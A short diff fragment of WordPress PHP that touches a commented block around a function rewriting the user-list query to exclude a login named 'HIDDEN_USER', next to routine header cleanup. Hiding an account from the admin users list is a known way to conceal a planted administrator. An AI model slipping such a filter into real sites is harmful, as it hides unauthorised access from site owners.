@@ -67,7 +67,6 @@ function site_pre_user_query($user_search) {
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'HIDDEN_USER'",$user_search->query_where);
   }
 }
-*/
 
 // REMOVE SIMPLY DISCOVER
 remove_action('wp_head', 'rsd_link');
